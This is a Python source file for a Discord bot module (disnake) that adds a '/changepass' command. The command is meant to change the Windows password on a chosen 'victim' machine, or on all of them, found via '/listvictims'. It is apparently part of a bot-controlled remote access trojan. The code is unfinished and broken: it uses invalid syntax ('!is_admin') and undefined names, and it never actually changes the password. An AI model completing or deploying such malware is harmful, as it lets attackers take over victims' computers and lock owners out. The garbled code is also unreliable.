import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests, ctypes
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class ChangePass(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.slash_command( )
    async def changepass(self, ctx, victim, password):     
        """Changes the password of victim's windows profile. Admin required
        
        Parameters
        ----------
        victim: Identifier of the affected computer (found via /listvictims).
        password: new password to put in
        """
        
        if str(victim) == str(self.bot.identifier) or str(victim).lower() == "all":
            try:
                is_admin = os.getuid() == 0
            except AttributeError:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             
            if !is_admin:
                client.genEmbed(tdw)

def setup(bot: commands.Bot):
    bot.add_cog(ChangePass(bot))
